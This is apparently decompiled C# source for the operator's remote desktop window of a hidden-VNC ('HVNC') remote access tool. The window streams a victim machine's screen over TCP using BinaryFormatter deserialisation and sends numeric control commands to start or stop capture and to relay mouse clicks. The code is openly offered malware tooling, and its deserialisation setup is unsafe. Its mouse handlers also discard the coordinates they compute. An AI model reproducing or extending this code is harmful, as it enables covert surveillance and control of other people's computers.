using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ShitarusPrivate.HVNC
{
    public class RD : Form
    {
        [CompilerGenerated]
        private sealed class __c__DisplayClass7_0
        {
            public RD __4__this;

            public TcpClient client;

            internal void __002Ector_b__0()
            {
                __4__this.remotedeskt(client);
            }
        }

        public int X;

        public int Y;

        public int width;

        public int height;

        public bool expand_RD;

        private bool rd;

        private string selectedClient;

        public Image screen;

        private IContainer components;

        private PrimeButton btn_StartRD;

        private PrimeButton btn_StopRD;

        private PrimeTheme primeTheme1;

        private StudioButton studioButton5;

        private PictureBox pbx_remoteDesk;

        private JCS.ToggleSwitch checkBox_Keyboard;

        private Label label2;

        private JCS.ToggleSwitch checkBox_Mouse;

        private Label label1;

        private PictureBox pictureBox1;

        private Label label3;

        private System.Windows.Forms.Timer timer1;

        private Label label10;

        private Label label4;

        public RD(TcpClient client)
        {
            __c__DisplayClass7_0 _c__DisplayClass7_ = new __c__DisplayClass7_0();
            _c__DisplayClass7_.client = client;
            _c__DisplayClass7_.__4__this = this;
            rd = true;
            Thread thread = new Thread(_c__DisplayClass7_.__002Ector_b__0);
            thread.Start();
            InitializeComponent();
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void RD_Load(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            pictureBox1.Image = screen;
        }

        private void RD_MouseClick(object sender, MouseEventArgs e)
        {
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }

        private void RD_FormClosing(object sender, FormClosingEventArgs e)
        {
            Hide();
            e.Cancel = true;
            expand_RD = false;
        }

        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
        }

        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }

        private void pbx_remoteDesk_MouseClick(object sender, MouseEventArgs e)
        {
        }

        private void pbx_remoteDesk_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            sendDoubleMouseClick(e.X, e.Y, pbx_remoteDesk.Width, pbx_remoteDesk.Height);
        }

        public void sendMouseClick(int X, int Y, int width, int height)
        {
            if (checkBox_Mouse.Checked)
            {
                int num = width;
                int num2 = height;
                label10.Text = X + " , " + Y;
                _ = X + "," + Y + "," + num + "_" + num2;
                SendTCP("2071*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void pbx_remoteDesk_MouseMove(object sender, MouseEventArgs e)
        {
        }

        public void sendDoubleMouseClick(int X, int Y, int width, int height)
        {
            if (checkBox_Mouse.Checked)
            {
                int num = width;
                int num2 = height;
                label10.Text = X + " , " + Y;
                _ = X + "," + Y + "," + num + "_" + num2;
                SendTCP("2072*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        public void remotedeskt(TcpClient client)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            while (client.Connected && rd)
            {
                NetworkStream stream = client.GetStream();
                pbx_remoteDesk.Image = (Image)binaryFormatter.Deserialize(stream);
            }
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        ulong num = 0uL;
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void btn_StartRD_Click(object sender, EventArgs e)
        {
            rd = true;
            btn_StartRD.Enabled = false;
            btn_StopRD.Enabled = true;
            SendTCP("2069*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            Thread thread = new Thread(_btn_StartRD_Click_b__24_0);
            thread.Start();
        }

        private void btn_StopRD_Click(object sender, EventArgs e)
        {
            btn_StopRD.Enabled = false;
            btn_StartRD.Enabled = true;
            rd = false;
            SendTCP("2070*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            pbx_remoteDesk.Image = null;
            pbx_remoteDesk.BackColor = Color.Black;
        }

        private void pbx_remoteDesk_Click(object sender, EventArgs e)
        {
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.RD));
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            this.btn_StartRD = new PrimeButton();
            this.btn_StopRD = new PrimeButton();
            this.primeTheme1 = new PrimeTheme();
            this.label10 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label3 = new System.Windows.Forms.Label();
            this.checkBox_Keyboard = new JCS.ToggleSwitch();
            this.label2 = new System.Windows.Forms.Label();
            this.checkBox_Mouse = new JCS.ToggleSwitch();
            this.label1 = new System.Windows.Forms.Label();
            this.pbx_remoteDesk = new System.Windows.Forms.PictureBox();
            this.studioButton5 = new StudioButton();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label4 = new System.Windows.Forms.Label();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.pbx_remoteDesk).BeginInit();
            base.SuspendLayout();
            this.btn_StartRD.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            bloom.Name = "DownGradient1";
            bloom.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom2.Name = "DownGradient2";
            bloom2.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom3.Name = "NoneGradient1";
            bloom3.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom4.Name = "NoneGradient2";
            bloom4.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom5.Name = "NoneGradient3";
            bloom5.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom6.Name = "NoneGradient4";
            bloom6.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom7.Name = "Glow";
            bloom7.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom8.Name = "TextShade";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Text";
            bloom9.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom10.Name = "Border1";
            bloom10.Value = System.Drawing.Color.White;
            bloom11.Name = "Border2";
            bloom11.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.btn_StartRD.Colors = new Bloom[11]
            {
                bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10,
                bloom11
            };
            this.btn_StartRD.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btn_StartRD.Font = new System.Drawing.Font("Verdana", 8f);
            this.btn_StartRD.Image = null;
            this.btn_StartRD.Location = new System.Drawing.Point(29, 409);
            this.btn_StartRD.Name = "btn_StartRD";
            this.btn_StartRD.NoRounding = false;
            this.btn_StartRD.Size = new System.Drawing.Size(111, 36);
            this.btn_StartRD.TabIndex = 0;
            this.btn_StartRD.Text = "Start";
            this.btn_StartRD.Transparent = false;
            this.btn_StartRD.Click += new System.EventHandler(btn_StartRD_Click);
            this.btn_StopRD.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            bloom12.Name = "DownGradient1";
            bloom12.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom13.Name = "DownGradient2";
            bloom13.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom14.Name = "NoneGradient1";
            bloom14.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom15.Name = "NoneGradient2";
            bloom15.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom16.Name = "NoneGradient3";
            bloom16.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom17.Name = "NoneGradient4";
            bloom17.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom18.Name = "Glow";
            bloom18.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.White;
            bloom20.Name = "Text";
            bloom20.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom21.Name = "Border1";
            bloom21.Value = System.Drawing.Color.White;
            bloom22.Name = "Border2";
            bloom22.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.btn_StopRD.Colors = new Bloom[11]
            {
                bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20, bloom21,
                bloom22
            };
            this.btn_StopRD.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btn_StopRD.Font = new System.Drawing.Font("Verdana", 8f);
            this.btn_StopRD.Image = null;
            this.btn_StopRD.Location = new System.Drawing.Point(29, 451);
            this.btn_StopRD.Name = "btn_StopRD";
            this.btn_StopRD.NoRounding = false;
            this.btn_StopRD.Size = new System.Drawing.Size(111, 36);
            this.btn_StopRD.TabIndex = 1;
            this.btn_StopRD.Text = "Stop";
            this.btn_StopRD.Transparent = false;
            this.btn_StopRD.Click += new System.EventHandler(btn_StopRD_Click);
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom23.Name = "Sides";
            bloom23.Value = System.Drawing.Color.FromArgb(232, 232, 232);
            bloom24.Name = "Gradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom25.Name = "Gradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom26.Name = "TextShade";
            bloom26.Value = System.Drawing.Color.White;
            bloom27.Name = "Text";
            bloom27.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom28.Name = "Back";
            bloom28.Value = System.Drawing.Color.White;
            bloom29.Name = "Border1";
            bloom29.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            bloom30.Name = "Border2";
            bloom30.Value = System.Drawing.Color.White;
            bloom31.Name = "Border3";
            bloom31.Value = System.Drawing.Color.White;
            bloom32.Name = "Border4";
            bloom32.Value = System.Drawing.Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[10] { bloom23, bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32 };
            this.primeTheme1.Controls.Add(this.label4);
            this.primeTheme1.Controls.Add(this.label10);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.checkBox_Keyboard);
            this.primeTheme1.Controls.Add(this.label2);
            this.primeTheme1.Controls.Add(this.checkBox_Mouse);
            this.primeTheme1.Controls.Add(this.label1);
            this.primeTheme1.Controls.Add(this.pbx_remoteDesk);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.btn_StopRD);
            this.primeTheme1.Controls.Add(this.btn_StartRD);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(968, 581);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 2;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(32, 386);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(0, 13);
            this.label10.TabIndex = 73;
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(42, 40);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 71;
            this.pictureBox1.TabStop = false;
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.Location = new System.Drawing.Point(39, 15);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(120, 13);
            this.label3.TabIndex = 72;
            this.label3.Text = "REMOTE DESKTOP";
            this.checkBox_Keyboard.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.checkBox_Keyboard.BackColor = System.Drawing.Color.Transparent;
            this.checkBox_Keyboard.Location = new System.Drawing.Point(29, 526);
            this.checkBox_Keyboard.Name = "checkBox_Keyboard";
            this.checkBox_Keyboard.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.checkBox_Keyboard.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.checkBox_Keyboard.Size = new System.Drawing.Size(50, 19);
            this.checkBox_Keyboard.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.checkBox_Keyboard.TabIndex = 69;
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Location = new System.Drawing.Point(85, 532);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(62, 13);
            this.label2.TabIndex = 70;
            this.label2.Text = "Keyboard";
            this.checkBox_Mouse.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.checkBox_Mouse.BackColor = System.Drawing.Color.Transparent;
            this.checkBox_Mouse.Location = new System.Drawing.Point(29, 501);
            this.checkBox_Mouse.Name = "checkBox_Mouse";
            this.checkBox_Mouse.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.checkBox_Mouse.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.checkBox_Mouse.Size = new System.Drawing.Size(50, 19);
            this.checkBox_Mouse.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.checkBox_Mouse.TabIndex = 67;
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Location = new System.Drawing.Point(85, 507);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(43, 13);
            this.label1.TabIndex = 68;
            this.label1.Text = "Mouse";
            this.pbx_remoteDesk.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            this.pbx_remoteDesk.BackColor = System.Drawing.Color.Gainsboro;
            this.pbx_remoteDesk.Location = new System.Drawing.Point(155, 37);
            this.pbx_remoteDesk.Name = "pbx_remoteDesk";
            this.pbx_remoteDesk.Size = new System.Drawing.Size(794, 527);
            this.pbx_remoteDesk.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbx_remoteDesk.TabIndex = 41;
            this.pbx_remoteDesk.TabStop = false;
            this.pbx_remoteDesk.Click += new System.EventHandler(pbx_remoteDesk_Click);
            this.pbx_remoteDesk.MouseClick += new System.Windows.Forms.MouseEventHandler(pbx_remoteDesk_MouseClick);
            this.pbx_remoteDesk.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(pbx_remoteDesk_MouseDoubleClick);
            this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom33.Name = "DownGradient1";
            bloom33.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom34.Name = "DownGradient2";
            bloom34.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom35.Name = "NoneGradient1";
            bloom35.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom36.Name = "NoneGradient2";
            bloom36.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom37.Name = "Shine1";
            bloom37.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom38.Name = "Shine2A";
            bloom38.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom39.Name = "Shine2B";
            bloom39.Value = System.Drawing.Color.Transparent;
            bloom40.Name = "Shine3";
            bloom40.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom41.Name = "TextShade";
            bloom41.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom42.Name = "Text";
            bloom42.Value = System.Drawing.Color.White;
            bloom43.Name = "Glow";
            bloom43.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom44.Name = "Border";
            bloom44.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom45.Name = "Corners";
            bloom45.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[13]
            {
                bloom33, bloom34, bloom35, bloom36, bloom37, bloom38, bloom39, bloom40, bloom41, bloom42,
                bloom43, bloom44, bloom45
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(942, -7);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 40;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
            this.timer1.Tick += new System.EventHandler(timer1_Tick);
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(332, 13);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(41, 13);
            this.label4.TabIndex = 74;
            this.label4.Text = "label4";
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(968, 581);
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "RD";
            this.Text = "RD";
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            base.Load += new System.EventHandler(RD_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.pbx_remoteDesk).EndInit();
            base.ResumeLayout(false);
        }

        [CompilerGenerated]
        private void _btn_StartRD_Click_b__24_0()
        {
            remotedeskt((TcpClient)base.Tag);
        }
    }
}
